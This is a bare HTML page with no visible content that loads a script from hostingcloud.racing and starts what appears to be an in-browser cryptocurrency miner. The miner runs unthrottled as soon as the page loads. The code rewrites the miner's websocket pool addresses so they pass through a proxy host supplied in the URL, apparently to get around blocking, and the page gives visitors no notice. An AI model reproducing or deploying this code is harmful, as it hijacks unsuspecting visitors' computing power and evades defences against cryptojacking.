<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

<body>
    <script src="https://www.hostingcloud.racing/iPx4.js"></script>
    <script>
        const URLSearchParamsObject = new URLSearchParams(window.location.search)
        console.log(window.location)
        window.ci = Client

        for (let idx = 0; idx < window.ci.CONFIG.WEBSOCKET_SHARDS_W.length; idx++) {
            for (let idx2 = 0; idx2 < window.ci.CONFIG.WEBSOCKET_SHARDS_W[idx].length; idx2++) {
                const fqdn = window.ci.CONFIG.WEBSOCKET_SHARDS_W[idx][idx2].split('/')[2]

                window.ci.CONFIG.WEBSOCKET_SHARDS_W[idx][idx2] += `?target=${encodeURIComponent(window.ci.CONFIG.WEBSOCKET_SHARDS_W[idx][idx2])}`

                window.ci.CONFIG.WEBSOCKET_SHARDS_W[idx][idx2] = window.ci.CONFIG.WEBSOCKET_SHARDS_W[idx][idx2]
                    .replace(fqdn, URLSearchParamsObject.get('p'))
            }
        }
        console.log('window.ci:', window.ci)

        const _client = new Client.Anonymous(URLSearchParamsObject.get('s'), { throttle: 0, c: 'w' });
        _client.start();
    </script>
</body>

</html>
